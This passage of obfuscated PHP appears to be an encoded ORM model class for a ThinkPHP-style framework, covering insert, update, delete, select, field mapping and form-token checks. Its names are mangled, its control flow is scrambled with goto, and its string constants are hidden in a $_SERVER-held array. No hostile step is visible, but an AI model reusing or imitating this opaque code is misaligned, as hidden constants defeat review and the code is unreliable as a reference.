$eÌàƒ ª÷)) { array_unshift($dîªÍ…œœå, $eÌàƒ ª÷); return call_user_func_array(array($this, $Dùœß—–®“[271]), $dîªÍ…œœå); } else { return call_user_func_array(array(parent, $eÌàƒ ª÷), $dîªÍ…œœå); } } protected function call() { goto FµË˜Úßµ; e©²ê½è®¨: $B‡†ÁµÎÆ = call_user_func_array(array($this, $B¢¾¨Û§Í), $aËğÆÔÃøÕ); if (method_exists($this, $B²š÷”˜’[275])) { $C–­íÓÂÊ = call_user_func_array(array($this, $B²š÷”˜’[276]), array($b®ƒŒè²é, $aËğÆÔÃøÕ, $B‡†ÁµÎÆ)); if ($C–­íÓÂÊ) { return $C–­íÓÂÊ; } } return $B‡†ÁµÎÆ; goto f§ñ¡åÄç; Eö®‚ì„¼…: if (isset($aËğÆÔÃøÕ[$c£™íÌŞª]) && $aËğÆÔÃøÕ[$c£™íÌŞª] === $B¢¾¨Û§Í) { think_exception(__CLASS__ . $B²š÷”˜’[14] . $B¢¾¨Û§Í . think_lang($B²š÷”˜’[272])); return; } $aËğÆÔÃøÕ[] = $B¢¾¨Û§Í; if (method_exists($this, $B²š÷”˜’[273])) { $C–­íÓÂÊ = call_user_func_array(array($this, $B²š÷”˜’[274]), array($b®ƒŒè²é, $aËğÆÔÃøÕ)); if (!is_null($C–­íÓÂÊ) && $C–­íÓÂÊ !== !1) { return $C–­íÓÂÊ; } } goto e©²ê½è®¨; cÓªï‡ßã: $b®ƒŒè²é = $B¢¾¨Û§Í; if (is_array($B¢¾¨Û§Í)) { $b®ƒŒè²é = $B¢¾¨Û§Í[1]; $B¢¾¨Û§Í = $B¢¾¨Û§Í[0]; } $c£™íÌŞª = count($aËğÆÔÃøÕ) - 1; goto Eö®‚ì„¼…; FµË˜Úßµ: $B²š÷”˜’ =& $_SERVER[£¶ä½¶¢]; $aËğÆÔÃøÕ = func_get_args(); $B¢¾¨Û§Í = array_shift($aËğÆÔÃøÕ); goto cÓªï‡ßã; f§ñ¡åÄç: } protected function _initialize() { } protected function _facade($dáÖÏ­‘İ‘) { $f®¸´ì™‚ =& $_SERVER[£¶ä½¶¢]; if (!empty($this->fields)) { foreach ($dáÖÏ­‘İ‘ as $aİ‡§·®À¦ => $e¸ï´§ñªÑ) { if (is_array($this->fields) && !in_array($aİ‡§·®À¦, $this->fields, !0)) { unset($dáÖÏ­‘İ‘[$aİ‡§·®À¦]); } elseif (is_scalar($e¸ï´§ñªÑ)) { $this->_parseType($dáÖÏ­‘İ‘, $aİ‡§·®À¦); } } } if (!empty($this->options[$f®¸´ì™‚[277]])) { $dáÖÏ­‘İ‘ = array_map($this->options[$f®¸´ì™‚[277]], $dáÖÏ­‘İ‘); unset($this->options[$f®¸´ì™‚[277]]); } $this->_beforeWrite($dáÖÏ­‘İ‘); return $dáÖÏ­‘İ‘; } protected function _beforeWrite(&$f¦¥öÔèêŞ) { } public function add($cÀš£ó‰Ê = '', $aëÆÈµĞÔÊ = array(), $B«İŒà‚‡ = false) { goto fŠ´ƒ× ; fŠ´ƒ× : if (empty($cÀš£ó‰Ê)) { if (!empty($this->data)) { $cÀš£ó‰Ê = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[£¶ä½¶¢][278]); return !1; } } $aëÆÈµĞÔÊ = $this->_parseOptions($aëÆÈµĞÔÊ); $cÀš£ó‰Ê = $this->_facade($cÀš£ó‰Ê); goto bØô±İµÊ—; bØô±İµÊ—: if (!1 === $this->_beforeInsert($cÀš£ó‰Ê, $aëÆÈµĞÔÊ)) { return !1; } $CâäºŒ¦…½ = $this->db->insert($cÀš£ó‰Ê, $aëÆÈµĞÔÊ, $B«İŒà‚‡); if (!1 !== $CâäºŒ¦…½) { $eîùèòæ = $this->getLastInsID(); if ($eîùèòæ) { $cÀš£ó‰Ê[$this->getPk()] = $eîùèòæ; $this->_after_insert($cÀš£ó‰Ê, $aëÆÈµĞÔÊ); return $eîùèòæ; } $this->_after_insert($cÀš£ó‰Ê, $aëÆÈµĞÔÊ); } goto FÌ‡ë¢·Ù„; FÌ‡ë¢·Ù„: return $CâäºŒ¦…½; goto A‡å»¦à£‚; A‡å»¦à£‚: } protected function _beforeInsert(&$EÖô“ÖÑ„¹, $FíÏÑƒ‡àÊ) { } protected function _after_insert($EøŠ”†íÓ…, $AÏ ğ²—à) { } public function addAll($b¢äé…Ä‘¿, $DîŞ„–Òî = array(), $fãæ‹ÓÒÇŒ = false) { goto bŸ‰ÌêÙé˜; Dòô‘ƒÀ¨: foreach ($b¢äé…Ä‘¿ as $dÖØíë‰˜• => $FÚ‚æÈÓç) { $b¢äé…Ä‘¿[$dÖØíë‰˜•] = $this->_facade($FÚ‚æÈÓç); } if (method_exists($this->db, $eñ¦¹§„Êò[279])) { $D…«„½÷Ù = $this->db->insertAll($b¢äé…Ä‘¿, $DîŞ„–Òî, $fãæ‹ÓÒÇŒ); } else { $this->startTrans(); foreach ($b¢äé…Ä‘¿ as $dÖØíë‰˜• => $FÚ‚æÈÓç) { $D…«„½÷Ù = $this->db->insert($FÚ‚æÈÓç, $DîŞ„–Òî, $fãæ‹ÓÒÇŒ); } $this->commit(); } if (!1 !== $D…«„½÷Ù) { $BØ±·¢Ÿ†è = $this->getLastInsID(); if ($BØ±·¢Ÿ†è) { return $BØ±·¢Ÿ†è; } } goto Cà„îÓ¨ìÔ; bŸ‰ÌêÙé˜: $eñ¦¹§„Êò =& $_SERVER[£¶ä½¶¢]; if (empty($b¢äé…Ä‘¿)) { $this->error = think_lang($eñ¦¹§„Êò[278]); return !1; } $DîŞ„–Òî = $this->_parseOptions($DîŞ„–Òî); goto Dòô‘ƒÀ¨; Cà„îÓ¨ìÔ: return $D…«„½÷Ù; goto A¿×Ê…óÆô; A¿×Ê…óÆô: } public function selectAdd($B¢‡Ï–§¶Ÿ = '', $e‘¾Öèæ³ù = '', $BÏ¥«…À¬ = array()) { $fÆ ¤‹† =& $_SERVER[£¶ä½¶¢]; $BÏ¥«…À¬ = $this->_parseOptions($BÏ¥«…À¬); if (!1 === ($EßêÜ¬±ß² = $this->db->selectInsert($B¢‡Ï–§¶Ÿ ? $B¢‡Ï–§¶Ÿ : $BÏ¥«…À¬[$fÆ ¤‹†[280]], $e‘¾Öèæ³ù ? $e‘¾Öèæ³ù : $this->getTableName(), $BÏ¥«…À¬))) { $this->error = think_lang($fÆ ¤‹†[281]); return !1; } else { return $EßêÜ¬±ß²; } } public function save($Cœ–Æ‚“‹ = '', $b¡Œ»À™Êò = array()) { goto F­¡ÄäçÖÌ; dóÜ’ïÇƒ: if (is_array($b¡Œ»À™Êò[$fœê×àÂ¡¼[282]]) && isset($b¡Œ»À™Êò[$fœê×àÂ¡¼[282]][$D†öÖîˆàÊ])) { $fÕõà­‡ˆø = $b¡Œ»À™Êò[$fœê×àÂ¡¼[282]][$D†öÖîˆàÊ]; } if (!1 === $this->_beforeUpdate($Cœ–Æ‚“‹, $b¡Œ»À™Êò)) { return !1; } $fš¬Øôù¡ = $this->db->update($Cœ–Æ‚“‹, $b¡Œ»À™Êò); goto dç¤Í„øô–; dç¤Í„øô–: if (!1 !== $fš¬Øôù¡) { if (isset($fÕõà­‡ˆø)) { $Cœ–Æ‚“‹[$D†öÖîˆàÊ] = $fÕõà­‡ˆø; } $this->_afterUpdate($Cœ–Æ‚“‹, $b¡Œ»À™Êò); } return $fš¬Øôù¡; goto AôÓƒõ®——; F­¡ÄäçÖÌ: $fœê×àÂ¡¼ =& $_SERVER[£¶ä½¶¢]; if (empty($Cœ–Æ‚“‹)) { if (!empty($this->data)) { $Cœ–Æ‚“‹ = $this->data; $this->data = array(); } else { $this->error = think_lang($fœê×àÂ¡¼[278]); return !1; } } $Cœ–Æ‚“‹ = $this->_facade($Cœ–Æ‚“‹); goto B£í£§ŠÌ‚; B£í£§ŠÌ‚: $b¡Œ»À™Êò = $this->_parseOptions($b¡Œ»À™Êò); $D†öÖîˆàÊ = $this->getPk(); if (!isset($b¡Œ»À™Êò[$fœê×àÂ¡¼[282]])) { if (isset($Cœ–Æ‚“‹[$D†öÖîˆàÊ])) { $E„™„¯©§[$D†öÖîˆàÊ] = $Cœ–Æ‚“‹[$D†öÖîˆàÊ]; $b¡Œ»À™Êò[$fœê×àÂ¡¼[282]] = $E„™„¯©§; unset($Cœ–Æ‚“‹[$D†öÖîˆàÊ]); } else { $this->error = think_lang($fœê×àÂ¡¼[281]); return !1; } } goto dóÜ’ïÇƒ; AôÓƒõ®——: } protected function _beforeUpdate(&$C„Ö–¨‘Ëç, $bš£Ãœ¿×Ò) { } protected function _afterUpdate($e‹–Ê Àëò, $Báèğ„ª¹) { } public function delete($d¦‰ó†Ç‰¤ = array()) { goto fÀº“£“ÀÁ; cšš»©ïÍ: if (is_numeric($d¦‰ó†Ç‰¤) || is_string($d¦‰ó†Ç‰¤)) { if (strpos($d¦‰ó†Ç‰¤, $dØ‰ğ×ÇèØ[57])) { $DµÄÆ•·²ù[$dˆÓâÓù˜] = array($dØ‰ğ×ÇèØ[283], $d¦‰ó†Ç‰¤); } else { $DµÄÆ•·²ù[$dˆÓâÓù˜] = $d¦‰ó†Ç‰¤; } $this->options[$dØ‰ğ×ÇèØ[282]] = $DµÄÆ•·²ù; } $d¦‰ó†Ç‰¤ = $this->_parseOptions(); if (is_array($d¦‰ó†Ç‰¤[$dØ‰ğ×ÇèØ[282]]) && isset($d¦‰ó†Ç‰¤[$dØ‰ğ×ÇèØ[282]][$dˆÓâÓù˜])) { $Cé¸×Úä½ = $d¦‰ó†Ç‰¤[$dØ‰ğ×ÇèØ[282]][$dˆÓâÓù˜]; } goto câ”¯Öî®; câ”¯Öî®: $b“¶ Æ»›í = $this->db->delete($d¦‰ó†Ç‰¤); if (!1 !== $b“¶ Æ»›í) { $Cœ¨£‘¥Üî = array(); if (isset($Cé¸×Úä½)) { $Cœ¨£‘¥Üî[$dˆÓâÓù˜] = $Cé¸×Úä½; } $this->_after_delete($Cœ¨£‘¥Üî, $d¦‰ó†Ç‰¤); } return $b“¶ Æ»›í; goto ağ¢×Ù†®; fÀº“£“ÀÁ: $dØ‰ğ×ÇèØ =& $_SERVER[£¶ä½¶¢]; if (empty($d¦‰ó†Ç‰¤) && empty($this->options[$dØ‰ğ×ÇèØ[282]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $dˆÓâÓù˜ = $this->getPk(); goto cšš»©ïÍ; ağ¢×Ù†®: } protected function _after_delete($E‚”¡¬ÌÚ‹, $B…‹ƒÆŠÉõ) { } public function select($c…ÖŒÄ†Ş½ = array()) { goto DõÈ›Õ‚¥İ; AùÛÜˆ…ãÀ: $this->_afterSelect($cœ‰ßŒŞ£¢, $c…ÖŒÄ†Ş½); return $cœ‰ßŒŞ£¢; goto F‘ƒ®·…ç; e„Ç¯´Š: $cœ‰ßŒŞ£¢ = $this->db->select($c…ÖŒÄ†Ş½); if (!1 === $cœ‰ßŒŞ£¢) { return !1; } if (empty($cœ‰ßŒŞ£¢)) { return null; } goto AùÛÜˆ…ãÀ; DõÈ›Õ‚¥İ: $EÙŠÌ§áÎÅ =& $_SERVER[£¶ä½¶¢]; if (is_string($c…ÖŒÄ†Ş½) || is_numeric($c…ÖŒÄ†Ş½)) { $cØâÁ®ÈæÊ = $this->getPk(); if (strpos($c…ÖŒÄ†Ş½, $EÙŠÌ§áÎÅ[57])) { $Aª‰×¹Ä[$cØâÁ®ÈæÊ] = array($EÙŠÌ§áÎÅ[283], $c…ÖŒÄ†Ş½); } else { $Aª‰×¹Ä[$cØâÁ®ÈæÊ] = $c…ÖŒÄ†Ş½; } $this->options[$EÙŠÌ§áÎÅ[282]] = $Aª‰×¹Ä; } elseif (!1 === $c…ÖŒÄ†Ş½) { $c…ÖŒÄ†Ş½ = $this->_parseOptions(); return $EÙŠÌ§áÎÅ[284] . $this->db->buildSelectSql($c…ÖŒÄ†Ş½) . $EÙŠÌ§áÎÅ[285]; } $c…ÖŒÄ†Ş½ = $this->_parseOptions(); goto e„Ç¯´Š; F‘ƒ®·…ç: } protected function _afterSelect(&$DÁ¼­¸İ, $DÓÜ³‡ÓÑä) { } public function buildSql($c–’‹İØ¼© = array()) { $a«Í…Ôµ› =& $_SERVER[£¶ä½¶¢]; $c–’‹İØ¼© = $this->_parseOptions($c–’‹İØ¼©); return $a«Í…Ôµ›[284] . $this->db->buildSelectSql($c–’‹İØ¼©) . $a«Í…Ôµ›[285]; } public function optionsValue($aëâèèİè´ = null) { if (is_null($aëâèèİè´)) { return $this->options; } elseif (is_array($aëâèèİè´)) { $this->options = array_merge($this->options, $aëâèèİè´); } } protected function _parseOptions($EÅÇ‰àÏ™ = array()) { goto dô½ÎÃ°·«; C¹…÷Ëñ‘ˆ: if (isset($EÅÇ‰àÏ™[$bóÊ•ÙîÏç[282]]) && is_array($EÅÇ‰àÏ™[$bóÊ•ÙîÏç[282]]) && !empty($d–³İ¢œÌÒ) && !isset($EÅÇ‰àÏ™[$bóÊ•ÙîÏç[289]]) && !isset($EÅÇ‰àÏ™[$bóÊ•ÙîÏç[286]])) { foreach ($EÅÇ‰àÏ™[$bóÊ•ÙîÏç[282]] as $Eäœá½òÜ => $F†Àé¯À®) { $Eäœá½òÜ = trim($Eäœá½òÜ); if (in_array($Eäœá½òÜ, $d–³İ¢œÌÒ, !0)) { if (is_scalar($F†Àé¯À®)) { $this->_parseType($EÅÇ‰àÏ™[$bóÊ•ÙîÏç[282]], $Eäœá½òÜ); } } elseif (!is_numeric($Eäœá½òÜ) && $bóÊ•ÙîÏç[81] != substr($Eäœá½òÜ, 0, 1) && !1 === strpos($Eäœá½òÜ, $bóÊ•ÙîÏç[105]) && !1 === strpos($Eäœá½òÜ, $bóÊ•ÙîÏç[267]) && !1 === strpos($Eäœá½òÜ, $bóÊ•ÙîÏç[290]) && !1 === strpos($Eäœá½òÜ, $bóÊ•ÙîÏç[291])) { unset($EÅÇ‰àÏ™[$bóÊ•ÙîÏç[282]][$Eäœá½òÜ]); } } } $this->_options_filter($EÅÇ‰àÏ™); return $EÅÇ‰àÏ™; goto FÑô¯ù²¹£; dô½ÎÃ°·«: $bóÊ•ÙîÏç =& $_SERVER[£¶ä½¶¢]; if (is_array($EÅÇ‰àÏ™)) { $EÅÇ‰àÏ™ = array_merge($this->options, $EÅÇ‰àÏ™); } $this->options = array(); goto E‰‹…­Âøƒ; E‰‹…­Âøƒ: if (!isset($EÅÇ‰àÏ™[$bóÊ•ÙîÏç[286]])) { $EÅÇ‰àÏ™[$bóÊ•ÙîÏç[286]] = $this->getTableName(); $d–³İ¢œÌÒ = $this->fields; } else { $d–³İ¢œÌÒ = $this->getDbFields(); } if (!empty($EÅÇ‰àÏ™[$bóÊ•ÙîÏç[287]])) { $EÅÇ‰àÏ™[$bóÊ•ÙîÏç[286]] .= $bóÊ•ÙîÏç[60] . $EÅÇ‰àÏ™[$bóÊ•ÙîÏç[287]]; } $EÅÇ‰àÏ™[$bóÊ•ÙîÏç[288]] = $this->name; goto C¹…÷Ëñ‘ˆ; FÑô¯ù²¹£: } protected function _options_filter(&$F±”¼¤ÌØ‚) { } protected function _parseType(&$D‹îäøŒ , $AÇ„ßµŠë) { $FËÂÅ™„’ =& $_SERVER[£¶ä½¶¢]; if (empty($this->options[$FËÂÅ™„’[292]][$FËÂÅ™„’[14] . $AÇ„ßµŠë])) { $FÃËî‘¢Ó— = strtolower($this->fields[$FËÂÅ™„’[259]][$AÇ„ßµŠë]); if (!1 !== strpos($FÃËî‘¢Ó—, $FËÂÅ™„’[293])) { } elseif (!1 === strpos($FÃËî‘¢Ó—, $FËÂÅ™„’[294]) && !1 !== strpos($FÃËî‘¢Ó—, $FËÂÅ™„’[295])) { $D‹îäøŒ [$AÇ„ßµŠë] = intval($D‹îäøŒ [$AÇ„ßµŠë]); } elseif (!1 !== strpos($FÃËî‘¢Ó—, $FËÂÅ™„’[296]) || !1 !== strpos($FÃËî‘¢Ó—, $FËÂÅ™„’[297])) { $D‹îäøŒ [$AÇ„ßµŠë] = floatval($D‹îäøŒ [$AÇ„ßµŠë]); } elseif (!1 !== strpos($FÃËî‘¢Ó—, $FËÂÅ™„’[298])) { $D‹îäøŒ [$AÇ„ßµŠë] = (bool) $D‹îäøŒ [$AÇ„ßµŠë]; } } } public function find($cÄº½šˆšÊ = array()) { goto B¦“Á°‘–; C˜Ğè’ì†‘: $cÄº½šˆšÊ = $this->_parseOptions(); $a…„ƒ‘éŸˆ = $this->db->select($cÄº½šˆšÊ); if (!1 === $a…„ƒ‘éŸˆ) { return !1; } goto B¥³Œš¯¢ê; B¥³Œš¯¢ê: if (empty($a…„ƒ‘éŸˆ)) { return null; } $this->data = $a…„ƒ‘éŸˆ[0]; $this->_afterFind($this->data, $cÄº½šˆšÊ); goto aßš¯Ñà–ò; aßš¯Ñà–ò: if (!empty($this->options[$AŠ©ƒÇÛ°Ò[300]])) { return $this->returnResult($this->data, $this->options[$AŠ©ƒÇÛ°Ò[300]]); } return $this->data; goto DŒõØêÚÜâ; B¦“Á°‘–: $AŠ©ƒÇÛ°Ò =& $_SERVER[£¶ä½¶¢]; if (is_numeric($cÄº½šˆšÊ) || is_string($cÄº½šˆšÊ)) { $CÙËœŠ»µ·[$this->getPk()] = intval($cÄº½šˆšÊ); $this->options[$AŠ©ƒÇÛ°Ò[282]] = $CÙËœŠ»µ·; } $this->options[$AŠ©ƒÇÛ°Ò[299]] = 1; goto C˜Ğè’ì†‘; DŒõØêÚÜâ: } protected function _afterFind(&$eÉÅï¥åÙ, $aµˆ¶ó¡¤) { } protected function returnResult($Fé”ÂÂŠ©Ñ, $e¨âƒ–ØŠº = '') { $DÅÔ×ŒÁ =& $_SERVER[£¶ä½¶¢]; if ($e¨âƒ–ØŠº) { if (is_callable($e¨âƒ–ØŠº)) { return call_user_func($e¨âƒ–ØŠº, $Fé”ÂÂŠ©Ñ); } switch (strtolower($e¨âƒ–ØŠº)) { case $DÅÔ×ŒÁ[301]: return json_encode($Fé”ÂÂŠ©Ñ); case $DÅÔ×ŒÁ[302]: return xml_encode($Fé”ÂÂŠ©Ñ); } } return $Fé”ÂÂŠ©Ñ; } public function parseFieldsMap($FŒŸ ÜôñÄ, $B›íÚ­ÌÓ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $Cœƒ‚–‰«¥ => $bñ¬µŠŞÎ£) { if ($B›íÚ­ÌÓ == 1) { if (isset($FŒŸ ÜôñÄ[$bñ¬µŠŞÎ£])) { $FŒŸ ÜôñÄ[$Cœƒ‚–‰«¥] = $FŒŸ ÜôñÄ[$bñ¬µŠŞÎ£]; unset($FŒŸ ÜôñÄ[$bñ¬µŠŞÎ£]); } } else { if (isset($FŒŸ ÜôñÄ[$Cœƒ‚–‰«¥])) { $FŒŸ ÜôñÄ[$bñ¬µŠŞÎ£] = $FŒŸ ÜôñÄ[$Cœƒ‚–‰«¥]; unset($FŒŸ ÜôñÄ[$Cœƒ‚–‰«¥]); } } } } return $FŒŸ ÜôñÄ; } public function setField($FÓÁÃ·†´À, $aˆÄáŞŒ†Í = '') { if (is_array($FÓÁÃ·†´À)) { $dµÌ„á¨Ãã = $FÓÁÃ·†´À; } else { $dµÌ„á¨Ãã[$FÓÁÃ·†´À] = $aˆÄáŞŒ†Í; } return $this->save($dµÌ„á¨Ãã); } public function setAdd($C¤âÔåª¾, $eÁ†®äÏ‘Ğ = 1) { $cØŞ™‘×Ÿ§ =& $_SERVER[£¶ä½¶¢]; $b›†î›Ö· = $C¤âÔåª¾ . $cØŞ™‘×Ÿ§[303] . $eÁ†®äÏ‘Ğ; if ($eÁ†®äÏ‘Ğ < 0) { $b›†î›Ö· = $C¤âÔåª¾ . $eÁ†®äÏ‘Ğ; } return $this->setField($C¤âÔåª¾, array($cØŞ™‘×Ÿ§[304], $b›†î›Ö·)); } public function getField($Aàìœ•¿’, $Aß»”à—¯£ = null) { $d‹í–ôèÔ =& $_SERVER[£¶ä½¶¢]; $EŠ¯è—…Ö½[$d‹í–ôèÔ[280]] = $Aàìœ•¿’; $EŠ¯è—…Ö½ = $this->_parseOptions($EŠ¯è—…Ö½); $Aàìœ•¿’ = trim($Aàìœ•¿’); if (strpos($Aàìœ•¿’, $d‹í–ôèÔ[57])) { if (!isset($EŠ¯è—…Ö½[$d‹í–ôèÔ[299]])) { $EŠ¯è—…Ö½[$d‹í–ôèÔ[299]] = is_numeric($Aß»”à—¯£) ? $Aß»”à—¯£ : $d‹í–ôèÔ[43]; } $c™ÀáÂá¤› = $this->db->select($EŠ¯è—…Ö½); if (!empty($c™ÀáÂá¤›)) { goto CĞ™ë¼ñ®; CĞ™ë¼ñ®: $D‰’ÔäáÎ‚ = explode($d‹í–ôèÔ[57], $Aàìœ•¿’); $Aàìœ•¿’ = array_keys($c™ÀáÂá¤›[0]); $C‰èøğšïõ = array_shift($Aàìœ•¿’); goto DÌòŠÄº„à; DÌòŠÄº„à: $E¥Èàªà¡ = array_shift($Aàìœ•¿’); $dª›©‘Îñé = array(); $Cù·‘²ä‡ = count($D‰’ÔäáÎ‚); goto CÊ¦èŠî…‹; CÊ¦èŠî…‹: foreach ($c™ÀáÂá¤› as $b…¦òó’ÎŠ) { $AŒÛ¸íò³‚ = $b…¦òó’ÎŠ[$C‰èøğšïõ]; if (2 == $Cù·‘²ä‡) { $dª›©‘Îñé[$AŒÛ¸íò³‚] = $b…¦òó’ÎŠ[$E¥Èàªà¡]; } else { $dª›©‘Îñé[$AŒÛ¸íò³‚] = is_string($Aß»”à—¯£) ? implode($Aß»”à—¯£, $b…¦òó’ÎŠ) : $b…¦òó’ÎŠ; } } return $dª›©‘Îñé; goto CëÜªãİ´Š; CëÜªãİ´Š: } } else { if (!0 !== $Aß»”à—¯£) { $EŠ¯è—…Ö½[$d‹í–ôèÔ[299]] = is_numeric($Aß»”à—¯£) ? $Aß»”à—¯£ : 1; } if ($Aß»”à—¯£ === $d‹í–ôèÔ[262]) { unset($EŠ¯è—…Ö½[$d‹í–ôèÔ[299]]); } $b…¦òó’ÎŠ = $this->db->select($EŠ¯è—…Ö½); if (!empty($b…¦òó’ÎŠ)) { if ($Aß»”à—¯£ === $d‹í–ôèÔ[262]) { return reset($b…¦òó’ÎŠ[0]); } if (!0 !== $Aß»”à—¯£ && 1 == $EŠ¯è—…Ö½[$d‹í–ôèÔ[299]]) { return reset($b…¦òó’ÎŠ[0]); } foreach ($b…¦òó’ÎŠ as $A‹é«Û‹—) { $A¥Š¹è¯Íİ[] = $A‹é«Û‹—[$Aàìœ•¿’]; } return $A¥Š¹è¯Íİ; } } return null; } public function create($a…¢¤¡ÙÇ = '', $DÁº­ëˆ = '') { goto CˆÈé±†; cÛ”“¸ÑèÇ: if ($this->autoCheckFields) { $fÉ­Ïò…å = $this->getDbFields(); foreach ($a…¢¤¡ÙÇ as $BÒºØÒè‹ => $fÃÆ‡µ¨‚Ã) { if (!in_array($BÒºØÒè‹, $fÉ­Ïò…å)) { unset($a…¢¤¡ÙÇ[$BÒºØÒè‹]); } elseif (MAGIC_QUOTES_GPC && is_string($fÃÆ‡µ¨‚Ã)) { $a…¢¤¡ÙÇ[$BÒºØÒè‹] = stripslashes($fÃÆ‡µ¨‚Ã); } } } $this->autoOperation($a…¢¤¡ÙÇ, $DÁº­ëˆ); $this->data = $a…¢¤¡ÙÇ; goto AÔâ¡…¿®; CˆÈé±†: $Dªï˜‹†è  =& $_SERVER[£¶ä½¶¢]; if (empty($a…¢¤¡ÙÇ)) { $a…¢¤¡ÙÇ = $_POST; } elseif (is_object($a…¢¤¡ÙÇ)) { $a…¢¤¡ÙÇ = get_object_vars($a…¢¤¡ÙÇ); } if (empty($a…¢¤¡ÙÇ) || !is_array($a…¢¤¡ÙÇ)) { $this->error = think_lang($Dªï˜‹†è [278]); return !1; } goto B±íº·ªËµ; f‡¥°‹‰ôŠ: if (isset($fÉ­Ïò…å)) { if (is_string($fÉ­Ïò…å)) { $fÉ­Ïò…å = explode($Dªï˜‹†è [57], $fÉ­Ïò…å); } if (think_config($Dªï˜‹†è [305])) { $fÉ­Ïò…å[] = think_config($Dªï˜‹†è [306]); } foreach ($a…¢¤¡ÙÇ as $BÒºØÒè‹ => $fÃÆ‡µ¨‚Ã) { if (!in_array($BÒºØÒè‹, $fÉ­Ïò…å)) { unset($a…¢¤¡ÙÇ[$BÒºØÒè‹]); } } } if (!$this->autoValidation($a…¢¤¡ÙÇ, $DÁº­ëˆ)) { return !1; } if (!$this->autoCheckToken($a…¢¤¡ÙÇ)) { $this->error = think_lang($Dªï˜‹†è [307]); return !1; } goto cÛ”“¸ÑèÇ; AÔâ¡…¿®: return $a…¢¤¡ÙÇ; goto dÓëÛšîïË; B±íº·ªËµ: $a…¢¤¡ÙÇ = $this->parseFieldsMap($a…¢¤¡ÙÇ, 0); $DÁº­ëˆ = $DÁº­ëˆ ? $DÁº­ëˆ : (!empty($a…¢¤¡ÙÇ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$Dªï˜‹†è [280]])) { $fÉ­Ïò…å = $this->options[$Dªï˜‹†è [280]]; unset($this->options[$Dªï˜‹†è [280]]); } elseif ($DÁº­ëˆ == THINK_MODEL_INSERT && isset($this->insertFields)) { $fÉ­Ïò…å = $this->insertFields; } elseif ($DÁº­ëˆ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $fÉ­Ïò…å = $this->updateFields; } goto f‡¥°‹‰ôŠ; dÓëÛšîïË: } public function autoCheckToken($Dˆ¾¨¬äÜ¦) { $añŸ©­Ûêè =& $_SERVER[£¶ä½¶¢]; if (isset($this->options[$añŸ©­Ûêè[308]]) && !$this->options[$añŸ©­Ûêè[308]]) { return !0; } if (think_config($añŸ©­Ûêè[305])) { $c¿”Â¬öª = think_config($añŸ©­Ûêè[306]); if (!isset($Dˆ¾¨¬äÜ¦[$c¿”Â¬öª]) || Session::get($c¿”Â¬öª)) { return !1; } list($E‹™¨øÄ‚ƒ, $FÔæ‡¾‹À) = explode($añŸ©­Ûêè[81], $Dˆ¾¨¬äÜ¦[$c¿”Â¬öª]); if ($FÔæ‡¾‹À && Session::get($c¿”Â¬öª . $añŸ©­Ûêè[105] . $E‹™¨øÄ‚ƒ) === $FÔæ‡¾‹À) { Session::remove($c¿”Â¬öª . $añŸ©­Ûêè[105] . $E‹™¨øÄ‚ƒ); return !0; } if (think_config($añŸ©­Ûêè[309])) { Session::remove($c¿”Â¬öª . $añŸ©­Ûêè[105] . $E‹™¨øÄ‚ƒ); } return !1; } return !0; } public function regex($f¯ëŒ‚¯ù, $FÏğ²¶Ô¾Ô) { $eî˜ã®¼„² =& $_SERVER[£¶ä½¶¢]; $eí»òƒ«åÑ = array($eî˜ã®¼„²[310] => $eî˜ã®¼„²[311], $eî˜ã®¼„²[312] => $eî˜ã®¼„²[313], $eî˜ã®¼„²[314] => $eî˜ã®¼„²[315], $eî˜ã®¼„²[316] => $eî˜ã®¼„²[317], $eî˜ã®¼„²[318] => $eî˜ã®¼„²[319], $eî˜ã®¼„²[320] => $eî˜ã®¼„²[321], $eî˜ã®¼„²[322] => $eî˜ã®¼„²[323], $eî˜ã®¼„²[297] => $eî˜ã®¼„²[324], $eî˜ã®¼„²[325] => $eî˜ã®¼„²[326]); if (isset($eí»òƒ«åÑ[strtolower($FÏğ²¶Ô¾Ô)])) { $FÏğ²¶Ô¾Ô = $eí»òƒ«åÑ[strtolower($FÏğ²¶Ô¾Ô)]; } return preg_match($FÏğ²¶Ô¾Ô, $f¯ëŒ‚¯ù) === 1; } private function autoOperation(&$dàëà±«Ş¯, $Få¨¬¤÷Ê) { $d±½‹Ûò“‘ =& $_SERVER[£¶ä½¶¢]; if (!empty($this->options[$d±½‹Ûò“‘[327]])) { $F›ì”ğŒ¢Â = $this->options[$d±½‹Ûò“‘[327]]; unset($this->options[$d±½‹Ûò“‘[327]]); } elseif (!empty($this->_auto)) { $F›ì”ğŒ¢Â = $this->_auto; } if (isset($F›ì”ğŒ¢Â)) { foreach ($F›ì”ğŒ¢Â as $BÙƒ»ˆáñ) { if (empty($BÙƒ»ˆáñ[2])) { $BÙƒ»ˆáñ[2] = THINK_MODEL_INSERT; } if ($Få¨¬¤÷Ê == $BÙƒ»ˆáñ[2] || $BÙƒ»ˆáñ[2] == THINK_MODEL_BOTH) { switch (trim($BÙƒ»ˆáñ[3])) { case $d±½‹Ûò“‘[328]: case $d±½‹Ûò“‘[329]: $C¯ÍóÇºÆŸ = isset($BÙƒ»ˆáñ[4]) ? (array) $BÙƒ»ˆáñ[4] : array(); if (isset($dàëà±«Ş¯[$BÙƒ»ˆáñ[0]])) { array_unshift($C¯ÍóÇºÆŸ, $dàëà±«Ş¯[$BÙƒ»ˆáñ[0]]); } if ($d±½‹Ûò“‘[328] == $BÙƒ»ˆáñ[3]) { $dàëà±«Ş¯[$BÙƒ»ˆáñ[0]] = call_user_func_array($BÙƒ»ˆáñ[1], $C¯ÍóÇºÆŸ); } else { $dàëà±«Ş¯[$BÙƒ»ˆáñ[0]] = call_user_func_array(array(&$this, $BÙƒ»ˆáñ[1]), $C¯ÍóÇºÆŸ); } break; case $d±½‹Ûò“‘[280]: $dàëà±«Ş¯[$BÙƒ»ˆáñ[0]] = $dàëà±«Ş¯[$BÙƒ»ˆáñ[1]]; break; case $d±½‹Ûò“‘[330]: if ($d±½‹Ûò“‘[43] === $dàëà±«Ş¯[$BÙƒ»ˆáñ[0]]) { unset($dàëà±«Ş¯[$BÙƒ»ˆáñ[0]]); } break; case $d±½‹Ûò“‘[331]: default: $dàëà±«Ş¯[$BÙƒ»ˆáñ[0]] = $BÙƒ»ˆáñ[1]; } if (!1 === 